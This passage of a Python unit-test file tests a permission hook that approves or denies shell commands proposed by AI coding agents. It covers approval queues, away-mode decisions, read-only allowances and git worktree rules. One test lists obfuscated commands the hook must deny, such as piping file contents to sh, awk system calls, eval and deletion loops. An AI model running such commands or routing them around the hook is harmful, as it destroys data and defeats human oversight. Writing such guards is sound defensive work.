            with mock.patch.object(e.subprocess, 'run', return_value=subprocess.CompletedProcess([], 0, stdout, '')):
                self.assertFalse(e._coordinator_remote_proof(config, paths))
        with mock.patch.object(e.subprocess, 'run', side_effect=subprocess.TimeoutExpired('ssh', 1)):
            self.assertFalse(e._coordinator_remote_proof(config, paths))

    def test_concurrent_queue_appends_keep_complete_json_records(self):
        from concurrent.futures import ThreadPoolExecutor
        with mock.patch.dict(os.environ, {'SO_APPROVAL_MORNING_QUEUE': str(self.queue),
                                         'SO_APPROVAL_QUEUE_SEAT': 'YOUR_SEAT@YOUR_HOST.helm'}):
            with ThreadPoolExecutor(max_workers=4) as pool:
                results = list(pool.map(lambda i: e._queue_morning(self.event(f'fixture-{i}'), 'true_floor', 'away_flag'), range(20)))
        self.assertTrue(all(results))
        records = [json.loads(line) for line in self.queue.read_text().splitlines()]
        self.assertEqual({r['command'] for r in records}, {f'fixture-{i}' for i in range(20)})
        self.assertEqual(len(records), 20)

    def test_queue_lock_contention_denies_without_hanging(self):
        import fcntl
        self.flag.touch()
        self.queue.touch()
        with self.queue.open('a') as file:
            fcntl.flock(file, fcntl.LOCK_EX)
            decision = self.run_hook('unknown-command')
        self.assertEqual(decision['behavior'], 'deny')
        self.assertIn('queue unavailable', decision['message'])
        self.assertEqual(self.queue.read_text(), '')

    def test_away_decider_ask_denies_but_decider_allow_is_unchanged(self):
        self.flag.touch()
        self.manifest['decider']['enabled'] = True
        self.manifest['decider']['kikin_url'] = 'https://YOUR_DECIDER.invalid/decide'
        self.loaded()
        for verdict, expected in [(False, 'deny'), (True, 'allow')]:
            env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
            out = io.StringIO()
            with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('unknown-command')))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(verdict, 'accepted' if verdict else 'timeout', 1, 'allow' if verdict else 'ask')):
                e.main()
            self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], expected)

    def test_admiral_readonly_replay_command_reaches_normal_path(self):
        scratch = self.base / 'claude-1000'
        scratch.mkdir()
        self.manifest['scratch_roots'].append(str(scratch))
        files = [scratch / 'YOUR_TMP_A', scratch / 'YOUR_TMP_B', scratch / 'YOUR_TMP_C', scratch / 'YOUR_LOG_A', scratch / 'YOUR_LOG_B']
        for path in files:
            path.write_text('new synthetic\nold synthetic\n', encoding='utf-8')
        command = (f"ls -la {files[0]} {files[1]} {files[2]} 2>&1; "
                   f"pgrep -f 'codex exec' | wc -l; tail -3 {files[3]}; "
                   f"tail -3 {files[4]}; mailcortex inbox YOUR_SEAT@kikin.helm 2>&1 | grep '^new' | tail -3")
        self.manifest['classes'][0]['enabled'] = True
        self.assertEqual(self.run_hook(command)['behavior'], 'allow')

    def test_reviewed_state_and_palmcortex_reads_are_not_name_floored(self):
        state = Path.home() / '.local/state/dotcortex'
        state.mkdir(parents=True, exist_ok=True)
        log = state / 'YOUR_READONLY_LOG'
        log.write_text('synthetic\n')
        self.manifest['classes'][0]['enabled'] = True
        self.assertEqual(self.run_hook(f'cat {log}')['behavior'], 'allow')
        palm = self.repo / 'PalmCortex'
        (palm / 'README.md').parent.mkdir(parents=True, exist_ok=True)
        (palm / 'README.md').write_text('synthetic\n')
        self.assertEqual(self.run_hook('cat PalmCortex/README.md')['behavior'], 'allow')
        self.assertEqual(self.run_hook('cat PalmCortex/Clients/YOUR_SECRET.md')['behavior'], 'deny')

    def test_literal_read_loop_and_data_only_substitution(self):
        command = 'for f in README.org; do cat "$f"; done'
        self.manifest['classes'][0]['enabled'] = True
        self.assertEqual(self.run_hook(command)['behavior'], 'allow')
        self.assertEqual(self.run_hook('printf "%s\\n" "$(date)"')['behavior'], 'allow')
        self.assertEqual(self.run_hook('printf "%s\\n" "$(pgrep -f codex)"')['behavior'], 'allow')

    def test_absolute_floor_obfuscation_corpus(self):
        commands = [
            'cat README.md | tee copy', 'cat README.md | base64 | sh',
            'find . -exec cat {} +',
            "awk 'BEGIN { system(\"id\") }' README.md", 'sed -i s/a/b/ README.md',
            'cat README.md | xargs rm', 'eval "cat README.md"',
            'git -c core.pager=cat status', 'for f in README.md; do rm "$f"; done',
            'chmod +x README.md',
        ]
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(self.run_hook(command)['behavior'], 'deny')
        for command in ['cat README.md | sed -n 1p > copy',
                        f'cat README.md > {self.scratch / "YOUR_WRITE"}']:
            with self.subTest(allowed_write=command):
                self.assertEqual(self.run_hook(command)['behavior'], 'allow')

    def test_approval_queue_intent_and_resolve_are_agent_safe_actions(self):
        self.queue.write_text(json.dumps({'id': 'YOUR_ITEM', 'status': 'open', 'seat': 'YOUR_SEAT', 'count': 1, 'last_seen': '2026-01-01T00:00:00Z', 'first_seen': '2026-01-01T00:00:00Z', 'command_hashes': [], 'requests': []}) + '\n')
        self.manifest['classes'][0]['enabled'] = True
        for command in ['approval-queue intent YOUR_ITEM --text "review later"', 'approval-queue resolve YOUR_ITEM --how "handled"']:
            self.assertEqual(self.run_hook(command)['behavior'], 'allow')


    def test_configured_legacy_worktree_remove_and_prune(self):
        legacy = self.base / 'DotCortex-wt'
        legacy.mkdir()
        self.manifest['coordinator_ops']['worktree_roots'].append(str(legacy))
        self.manifest['roots'].append(str(legacy))
        path = legacy / 'worker'
        self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
        self.allow(f'git worktree remove {path}')
        self.allow('git worktree prune')
        # New additions retain the requested <repo>-wt-* root shape.
        self.ask(f'git worktree add {legacy}/new-worker -b new-worker master')



if __name__ == '__main__':
    unittest.main()
